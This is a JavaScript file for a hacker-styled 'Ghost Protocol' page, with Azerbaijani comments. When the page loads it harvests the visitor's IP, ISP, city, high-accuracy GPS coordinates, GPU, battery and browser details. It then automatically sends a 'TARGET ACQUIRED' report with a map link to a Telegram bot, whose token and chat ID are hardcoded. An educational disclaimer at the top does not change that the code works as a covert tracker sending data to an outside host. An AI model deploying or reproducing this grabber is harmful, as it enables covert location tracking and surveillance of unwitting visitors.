/**
 * ============================================
 * NEXUS GHOST PROTOCOL v5.0 - SHADOW TERMINAL
 * ============================================
 * 
 * WARNING: Bu kod yalnız təhsil və öz cihazlarınızın təhlükəsizlik
 * testi üçün nəzərdə tutulub. İcazəsiz istifadə qanun pozuntusudur.
 */

(function() {
    'use strict';

    // ===== KONFİQURASİYA =====
    const CONFIG = {
        // TELEGRAM KONFİQURASİYASI (NÜMUNƏ! REAL TOKEN İSTİFADƏ ETMƏYİN)
        TELEGRAM: {
            BOT_TOKEN: '6800223810:AAFxY2GC2A6PHl3oquOTDUWQMv-HMBXjdoA',
            CHAT_ID: '6353022269'
        },
        // API ENDPOINTS
        API: {
            IPIFY: 'https://api.ipify.org?format=json',
            IPAPI: 'https://ipapi.co'
        },
        // SCAN SETTINGS
        SCAN: {
            TIMEOUT: 10000,
            HIGH_ACCURACY: true,
            TOTAL_TASKS: 5
        },
        // SECURITY
        SECURITY: {
            MASK_IP_IN_LOGS: true,
            ENCRYPT_LOCAL: false // Production'da true edilməlidir
        }
    };

    // ===== QLOBAL STATE =====
    const state = {
        session: {
            id: null,
            startTime: null,
            timestamp: null
        },
        rawData: {
            session: {},
            system: {},
            network: {},
            geolocation: {},
            gpsLocation: null,
            hardware: {},
            security: {
                proxy: false,
                hosting: false,
                tor: false,
                vpn: false,
                riskScore: 0,
                vectors: []
            }
        },
        completedTasks: 0,
        mapInstance: null,
        charts: {}
    };

    // ===== DOM REFERANSLARI =====
    const DOM = {
        // Session
        sessionId: document.getElementById('sessionIdDisplay'),
        sessionTime: document.getElementById('sessionTimeDisplay'),
        sessionDate: document.getElementById('sessionDateDisplay'),
        progressFill: document.getElementById('progressFill'),
        progressPercent: document.getElementById('progressPercent'),
        scanStatus: document.getElementById('scanStatus'),
        liveDateTime: document.getElementById('liveDateTime'),
        
        // Geo
        geoCoords: document.getElementById('geoCoordsDisplay'),
        ispTag: document.getElementById('ispTagDisplay'),
        
        // Threat
        threatScore: document.getElementById('threatScore'),
        threatVectors: document.getElementById('threatVectors'),
        
        // Grids
        systemGrid: document.getElementById('systemGrid'),
        networkGrid: document.getElementById('networkGrid'),
        hardwareGrid: document.getElementById('hardwareGrid'),
        securityGrid: document.getElementById('securityGrid'),
        
        // Other
        rawJson: document.getElementById('rawJsonOutput'),
        toggleRaw: document.getElementById('toggleRawBtn'),
        telegramStatus: document.getElementById('telegramStatus'),
        
        // Buttons
        exportBtn: document.getElementById('exportReportBtn'),
        copyBtn: document.getElementById('copyJsonBtn'),
        telegramBtn: document.getElementById('telegramSendBtn'),
        refreshBtn: document.getElementById('refreshScanBtn')
    };

    // ===== MATRIX BACKGROUND (HACKER ESTETİKASI) =====
    function initMatrixBackground() {
        const canvas = document.getElementById('matrix-bg');
        if (!canvas) return;
        
        const ctx = canvas.getContext('2d');
        
        function resizeCanvas() {
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
        }
        window.addEventListener('resize', resizeCanvas);
        resizeCanvas();
        
        const chars = '01アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン';
        const fontSize = 14;
        const columns = canvas.width / fontSize;
        const drops = [];
        
        for (let i = 0; i < columns; i++) {
            drops[i] = Math.floor(Math.random() * -canvas.height / fontSize);
        }
        
        function draw() {
            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            
            ctx.fillStyle = '#00ff41';
            ctx.font = fontSize + 'px "Share Tech Mono", monospace';
            
            for (let i = 0; i < drops.length; i++) {
                const text = chars[Math.floor(Math.random() * chars.length)];
                const x = i * fontSize;
                const y = drops[i] * fontSize;
                
                ctx.fillText(text, x, y);
                
                if (y > canvas.height && Math.random() > 0.975) {
                    drops[i] = 0;
                }
                drops[i]++;
            }
        }
        
        setInterval(draw, 50);
    }

    // ===== UTILITY FUNKSİYALAR =====
    const utils = {
        generateSessionId: () => {
            const hex = '0123456789ABCDEF';
            let id = '0x';
            for (let i = 0; i < 8; i++) {
                id += hex[Math.floor(Math.random() * 16)];
            }
            return id;
        },
        
        formatTime: (date) => {
            return date.toLocaleTimeString('en-US', { hour12: false, hour: '2-digit', minute: '2-digit', second: '2-digit' });
        },
        
        formatDate: (date) => {
            return date.toISOString().split('T')[0].replace(/-/g, '.');
        },
        
        maskIP: (ip) => {
            if (!CONFIG.SECURITY.MASK_IP_IN_LOGS) return ip;
            return ip.replace(/(\d+\.\d+)\.\d+\.\d+/, '$1.xxx.xxx');
        },
        
        addGridRow: (grid, key, value, valueClass = '') => {
            if (!grid) return;
            const row = document.createElement('div');
            row.className = 'data-row';
            row.innerHTML = `
                <span class="data-key">${key}</span>
                <span class="data-val ${valueClass}">${value}</span>
            `;
            grid.appendChild(row);
        },
        
        updateProgress: () => {
            state.completedTasks++;
            const percent = Math.round((state.completedTasks / CONFIG.SCAN.TOTAL_TASKS) * 100);
            if (DOM.progressFill) DOM.progressFill.style.width = `${percent}%`;
            if (DOM.progressPercent) DOM.progressPercent.textContent = `${percent}%`;
            
            if (state.completedTasks >= CONFIG.SCAN.TOTAL_TASKS) {
                DOM.scanStatus.innerHTML = `<span class="pulse" style="background: #00ff41;"></span> ACQUIRED`;
                finalizeScan();
            }
        }
    };

    // ===== SESSİYA BAŞLANGICI =====
    function initSession() {
        const now = new Date();
        state.session.id = utils.generateSessionId();
        state.session.startTime = now;
        state.session.timestamp = now.toISOString();
        
        DOM.sessionId.textContent = state.session.id;
        DOM.sessionTime.textContent = utils.formatTime(now);
        DOM.sessionDate.textContent = utils.formatDate(now);
        
        state.rawData.session = {
            id: state.session.id,
            timestamp: state.session.timestamp,
            localTime: now.toString()
        };
        
        // Canlı saat
        setInterval(() => {
            const d = new Date();
            DOM.liveDateTime.textContent = `${utils.formatDate(d)} ${utils.formatTime(d)}`;
        }, 1000);
    }

    // ===== 1. SİSTEM ANALİZİ =====
    function analyzeSystem() {
        const nav = navigator;
        const screen = window.screen;
        const ua = nav.userAgent;
        
        // OS Detection
        let os = 'UNKNOWN';
        if (ua.includes('Windows NT 10.0')) os = 'Windows 10/11';
        else if (ua.includes('Windows NT 6.3')) os = 'Windows 8.1';
        else if (ua.includes('Windows NT 6.1')) os = 'Windows 7';
        else if (ua.includes('Mac OS X')) os = 'macOS';
        else if (ua.includes('Linux')) os = 'Linux';
        else if (ua.includes('Android')) os = 'Android';
        else if (ua.includes('iPhone') || ua.includes('iPad')) os = 'iOS';
        
        // Browser Detection
        let browser = 'UNKNOWN';
        if (ua.includes('Firefox')) browser = 'Firefox';
        else if (ua.includes('Edg')) browser = 'Edge';
        else if (ua.includes('Chrome')) browser = 'Chrome';
        else if (ua.includes('Safari')) browser = 'Safari';
        
        // GPU via WebGL
        let gpu = 'UNKNOWN';
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            const debugInfo = gl?.getExtension('WEBGL_debug_renderer_info');
            if (gl && debugInfo) {
                gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
            }
        } catch (e) {}
        
        const systemData = {
            'OS': os,
            'BROWSER': browser,
            'GPU_RENDERER': gpu,
            'LANGUAGE': nav.language,
            'RESOLUTION': `${screen.width}x${screen.height} @ ${screen.colorDepth}bit`,
            'TIMEZONE': Intl.DateTimeFormat().resolvedOptions().timeZone,
            'TOUCH': 'ontouchstart' in window ? 'ENABLED' : 'DISABLED',
            'COOKIES': nav.cookieEnabled ? 'ENABLED' : 'DISABLED',
            'PLATFORM': nav.platform || 'UNKNOWN'
        };
        
        state.rawData.system = systemData;
        Object.entries(systemData).forEach(([k, v]) => utils.addGridRow(DOM.systemGrid, k, v));
        utils.updateProgress();
    }

    // ===== 2. ŞƏBƏKƏ ANALİZİ =====
    async function analyzeNetwork() {
        try {
            const ipRes = await fetch(CONFIG.API.IPIFY);
            const ipData = await ipRes.json();
            const ip = ipData.ip;
            
            const geoRes = await fetch(`${CONFIG.API.IPAPI}/${ip}/json/`);
            const geo = await geoRes.json();
            
            if (geo.error) throw new Error(geo.reason);
            
            const networkData = {
                'IPv4': ip,
                'ISP': geo.org || 'UNKNOWN',
                'ASN': geo.asn || 'UNKNOWN',
                'COUNTRY': `${geo.country_name || ''} (${geo.country_code || ''})`,
                'CITY': geo.city || 'UNKNOWN',
                'REGION': geo.region || 'UNKNOWN',
                'TIMEZONE': geo.timezone || 'UNKNOWN',
                'COORDS': `${geo.latitude || '?'}, ${geo.longitude || '?'}`
            };
            
            state.rawData.network = networkData;
            state.rawData.geolocation = {
                lat: geo.latitude,
                lon: geo.longitude,
                city: geo.city,
                country: geo.country_name
            };
            
            Object.entries(networkData).forEach(([k, v]) => utils.addGridRow(DOM.networkGrid, k, v));
            
            DOM.geoCoords.textContent = `${geo.latitude || '?'}, ${geo.longitude || '?'}`;
            DOM.ispTag.textContent = geo.org || 'ISP UNKNOWN';
            
            // Təhlükəsizlik bayraqları
            state.rawData.security.proxy = geo.proxy || false;
            state.rawData.security.hosting = geo.hosting || false;
            state.rawData.security.tor = geo.tor || false;
            state.rawData.security.vpn = geo.vpn || false;
            
        } catch (err) {
            console.error('[GHOST] Network error:', err);
            utils.addGridRow(DOM.networkGrid, 'ERROR', 'CONNECTION_FAILED', 'val-danger');
        } finally {
            utils.updateProgress();
        }
    }

    // ===== 3. GPS GEOLOKASİYA =====
    function analyzeGeolocation() {
        if (!navigator.geolocation) {
            state.rawData.geolocation = { status: 'UNSUPPORTED' };
            utils.updateProgress();
            return;
        }
        
        const timeout = setTimeout(() => {
            state.rawData.geolocation = { status: 'TIMEOUT' };
            utils.addGridRow(DOM.networkGrid, 'GPS', 'TIMEOUT', 'val-warning');
            utils.updateProgress();
        }, CONFIG.SCAN.TIMEOUT);
        
        navigator.geolocation.getCurrentPosition(
            (pos) => {
                clearTimeout(timeout);
                const c = pos.coords;
                const gpsData = {
                    'GPS_LAT': c.latitude.toFixed(6),
                    'GPS_LON': c.longitude.toFixed(6),
                    'ACCURACY': `±${Math.round(c.accuracy)}m`,
                    'ALTITUDE': c.altitude ? `${c.altitude.toFixed(1)}m` : 'N/A',
                    'SPEED': c.speed ? `${(c.speed * 3.6).toFixed(1)}km/h` : 'N/A'
                };
                
                state.rawData.geolocation = gpsData;
                state.rawData.gpsLocation = { lat: c.latitude, lon: c.longitude };
                
                Object.entries(gpsData).forEach(([k, v]) => utils.addGridRow(DOM.networkGrid, k, v));
                DOM.geoCoords.textContent = `${c.latitude.toFixed(6)}, ${c.longitude.toFixed(6)}`;
                utils.updateProgress();
            },
            (err) => {
                clearTimeout(timeout);
                let msg = 'DENIED';
                if (err.code === 2) msg = 'NO_SIGNAL';
                if (err.code === 3) msg = 'TIMEOUT';
                state.rawData.geolocation = { status: msg };
                utils.addGridRow(DOM.networkGrid, 'GPS', msg, 'val-danger');
                utils.updateProgress();
            },
            { enableHighAccuracy: CONFIG.SCAN.HIGH_ACCURACY, timeout: CONFIG.SCAN.TIMEOUT, maximumAge: 0 }
        );
    }

    // ===== 4. APARAT ANALİZİ =====
    function analyzeHardware() {
        const nav = navigator;
        const hwData = {
            'CPU_CORES': nav.hardwareConcurrency || 'UNKNOWN',
            'RAM': nav.deviceMemory ? `${nav.deviceMemory} GB` : 'UNKNOWN',
            'CONNECTION': nav.connection?.effectiveType?.toUpperCase() || 'UNKNOWN',
            'DOWNLINK': nav.connection?.downlink ? `${nav.connection.downlink} Mbps` : 'UNKNOWN',
            'RTT': nav.connection?.rtt ? `${nav.connection.rtt} ms` : 'UNKNOWN'
        };
        
        state.rawData.hardware = hwData;
        Object.entries(hwData).forEach(([k, v]) => utils.addGridRow(DOM.hardwareGrid, k, v));
        
        if ('getBattery' in navigator) {
            navigator.getBattery().then(b => {
                const level = `${Math.round(b.level * 100)}%`;
                const charging = b.charging ? 'CHARGING' : 'BATTERY';
                utils.addGridRow(DOM.hardwareGrid, 'BATTERY', `${level} (${charging})`);
                state.rawData.hardware.battery = { level, charging };
            }).catch(() => {});
        }
        
        utils.updateProgress();
    }

    // ===== 5. TƏHLÜKƏSİZLİK ANALİZİ =====
    function analyzeSecurity() {
        const vectors = [];
        let score = 0;
        
        if (state.rawData.security.proxy) { score += 35; vectors.push('PROXY_DETECTED'); }
        if (state.rawData.security.hosting) { score += 45; vectors.push('HOSTING_IP'); }
        if (state.rawData.security.tor) { score += 55; vectors.push('TOR_EXIT'); }
        if (state.rawData.security.vpn) { score += 40; vectors.push('VPN_ACTIVE'); }
        
        const ua = navigator.userAgent;
        if (ua.includes('Headless')) { score += 25; vectors.push('HEADLESS'); }
        if (navigator.webdriver) { score += 30; vectors.push('WEBDRIVER'); }
        
        if (score > 100) score = 100;
        
        state.rawData.security.riskScore = score;
        state.rawData.security.vectors = vectors;
        
        DOM.threatScore.textContent = `${score}`;
        
        vectors.forEach(v => {
            const div = document.createElement('div');
            div.className = 'vector-item';
            div.innerHTML = `<span class="vector-dot"></span>${v}`;
            DOM.threatVectors.appendChild(div);
        });
        
        if (vectors.length === 0) {
            DOM.threatVectors.innerHTML = '<div class="vector-item"><span class="vector-dot safe"></span>NO_ANOMALIES</div>';
        }
        
        utils.addGridRow(DOM.securityGrid, 'PROXY', state.rawData.security.proxy ? 'TRUE' : 'FALSE', state.rawData.security.proxy ? 'val-danger' : '');
        utils.addGridRow(DOM.securityGrid, 'HOSTING', state.rawData.security.hosting ? 'TRUE' : 'FALSE', state.rawData.security.hosting ? 'val-danger' : '');
        utils.addGridRow(DOM.securityGrid, 'TOR', state.rawData.security.tor ? 'TRUE' : 'FALSE', state.rawData.security.tor ? 'val-danger' : '');
        utils.addGridRow(DOM.securityGrid, 'VPN', state.rawData.security.vpn ? 'TRUE' : 'FALSE', state.rawData.security.vpn ? 'val-danger' : '');
        utils.addGridRow(DOM.securityGrid, 'WEBDRIVER', navigator.webdriver ? 'TRUE' : 'FALSE', navigator.webdriver ? 'val-danger' : '');
        utils.addGridRow(DOM.securityGrid, 'RISK_SCORE', `${score}`, score > 30 ? 'val-danger' : 'val-highlight');
        
        utils.updateProgress();
    }

    // ===== FİNALİZASİYA =====
    function finalizeScan() {
        drawCharts();
        initMap();
        drawGhostFingerprint();
        updateRawOutput();
        setTimeout(() => sendToTelegram(), 1500);
    }

    // ===== XƏRİTƏ =====
    function initMap() {
        const lat = state.rawData.gpsLocation?.lat || state.rawData.geolocation?.lat || 40.4093;
        const lon = state.rawData.gpsLocation?.lon || state.rawData.geolocation?.lon || 49.8671;
        
        if (state.mapInstance) state.mapInstance.remove();
        
        state.mapInstance = L.map('leafletMap').setView([lat, lon], 13);
        L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
            attribution: '&copy; OpenStreetMap'
        }).addTo(state.mapInstance);
        
        L.marker([lat, lon]).addTo(state.mapInstance)
            .bindPopup(`${state.rawData.geolocation?.city || 'UNKNOWN'}, ${state.rawData.geolocation?.country || ''}`)
            .openPopup();
        
        L.circle([lat, lon], { radius: 500, color: '#00ff41', fillColor: '#00ff41', fillOpacity: 0.15 }).addTo(state.mapInstance);
    }

    // ===== CHARTLAR =====
    function drawCharts() {
        // Threat Gauge
        const gaugeCtx = document.getElementById('threatGauge')?.getContext('2d');
        if (gaugeCtx) {
            state.charts.gauge = new Chart(gaugeCtx, {
                type: 'doughnut',
                data: {
                    datasets: [{
                        data: [state.rawData.security.riskScore, 100 - state.rawData.security.riskScore],
                        backgroundColor: ['#ff0040', '#000000'],
                        borderWidth: 0
                    }]
                },
                options: { cutout: '75%', plugins: { tooltip: { enabled: false } } }
            });
        }
        
        // CPU Chart
        if (navigator.hardwareConcurrency) {
            const cpuCtx = document.getElementById('cpuCoresChart')?.getContext('2d');
            new Chart(cpuCtx, {
                type: 'doughnut',
                data: { datasets: [{ data: [navigator.hardwareConcurrency, Math.max(16 - navigator.hardwareConcurrency, 0)], backgroundColor: ['#00ff41', '#000000'] }] },
                options: { cutout: '65%', plugins: { legend: { display: false } } }
            });
        }
        
        // RAM Chart
        if (navigator.deviceMemory) {
            const ramCtx = document.getElementById('ramChart')?.getContext('2d');
            new Chart(ramCtx, {
                type: 'doughnut',
                data: { datasets: [{ data: [navigator.deviceMemory, Math.max(16 - navigator.deviceMemory, 0)], backgroundColor: ['#00ffff', '#000000'] }] },
                options: { cutout: '65%', plugins: { legend: { display: false } } }
            });
        }
    }

    function drawGhostFingerprint() {
        const canvas = document.getElementById('ghostCanvas');
        if (!canvas) return;
        const ctx = canvas.getContext('2d');
        
        ctx.fillStyle = '#000';
        ctx.fillRect(0, 0, 280, 70);
        ctx.font = 'bold 14px "Share Tech Mono", monospace';
        ctx.fillStyle = '#00ff41';
        ctx.fillText('GHOST://FINGERPRINT', 10, 25);
        ctx.font = '12px "Share Tech Mono", monospace';
        ctx.fillStyle = '#00ffff';
        ctx.fillText(`SID: ${state.session.id}`, 10, 50);
        
        const grad = ctx.createLinearGradient(0, 0, 280, 0);
        grad.addColorStop(0, '#00ff41');
        grad.addColorStop(0.5, '#ff0040');
        grad.addColorStop(1, '#00ffff');
        ctx.fillStyle = grad;
        ctx.fillRect(10, 60, 260, 2);
    }

    function updateRawOutput() {
        if (DOM.rawJson) {
            DOM.rawJson.textContent = JSON.stringify(state.rawData, null, 2);
        }
    }

    // ===== TELEGRAM BEACON =====
    async function sendToTelegram() {
        if (!DOM.telegramStatus) return;
        
        DOM.telegramStatus.style.display = 'flex';
        DOM.telegramStatus.className = 'status-bar sending';
        DOM.telegramStatus.innerHTML = '<i class="fas fa-spinner fa-spin"></i> BEACON_TRANSMITTING...';
        
        const message = formatTelegramMessage();
        
        try {
            const res = await fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM.BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CONFIG.TELEGRAM.CHAT_ID, text: message, parse_mode: 'HTML' })
            });
            const data = await res.json();
            
            if (data.ok) {
                DOM.telegramStatus.className = 'status-bar success';
                DOM.telegramStatus.innerHTML = '<i class="fas fa-check-circle"></i> BEACON_ACK_RECEIVED';
            } else {
                throw new Error(data.description);
            }
        } catch (e) {
            DOM.telegramStatus.className = 'status-bar error';
            DOM.telegramStatus.innerHTML = `<i class="fas fa-exclamation-triangle"></i> TRANSMISSION_FAILED: ${e.message}`;
        }
        
        setTimeout(() => { if (DOM.telegramStatus) DOM.telegramStatus.style.display = 'none'; }, 5000);
    }

    function formatTelegramMessage() {
        const d = state.rawData;
        return `
<b>👻 GHOST PROTOCOL // TARGET ACQUIRED</b>

<code>SID: ${d.session.id}</code>
<code>TIME: ${d.session.localTime}</code>

<b>💻 SYSTEM:</b>
• OS: ${d.system.OS}
• BROWSER: ${d.system.BROWSER}
• GPU: ${d.system.GPU_RENDERER}
• RES: ${d.system.RESOLUTION}

<b>🌐 NETWORK:</b>
• IP: ${d.network.IPv4}
• ISP: ${d.network.ISP}
• LOC: ${d.network.COUNTRY}, ${d.network.CITY}

<b>⚠️ THREAT SCORE: ${d.security.riskScore}%</b>
${d.security.vectors.map(v => `• ${v}`).join('\n')}

<b>🗺️ MAP:</b> https://maps.google.com/?q=${d.geolocation.lat},${d.geolocation.lon}
        `.trim();
    }

    // ===== EVENT LISTENERS =====
    function bindEvents() {
        DOM.toggleRaw?.addEventListener('click', () => {
            DOM.rawJson.style.display = DOM.rawJson.style.display === 'none' ? 'block' : 'none';
        });
        
        DOM.exportBtn?.addEventListener('click', () => {
            const blob = new Blob([JSON.stringify(state.rawData, null, 2)], { type: 'application/json' });
            const a = document.createElement('a');
            a.href = URL.createObjectURL(blob);
            a.download = `ghost_dump_${state.session.id}.json`;
            a.click();
        });
        
        DOM.copyBtn?.addEventListener('click', async () => {
            await navigator.clipboard?.writeText(JSON.stringify(state.rawData, null, 2));
            alert('[GHOST] JSON cloned to clipboard.');
        });
        
        DOM.telegramBtn?.addEventListener('click', sendToTelegram);
        DOM.refreshBtn?.addEventListener('click', () => window.location.reload());
    }

    // ===== BAŞLAT =====
    function init() {
        initMatrixBackground();
        initSession();
        analyzeSystem();
        analyzeNetwork();
        analyzeGeolocation();
        analyzeHardware();
        setTimeout(() => analyzeSecurity(), 1000);
        bindEvents();
    }

    init();
})();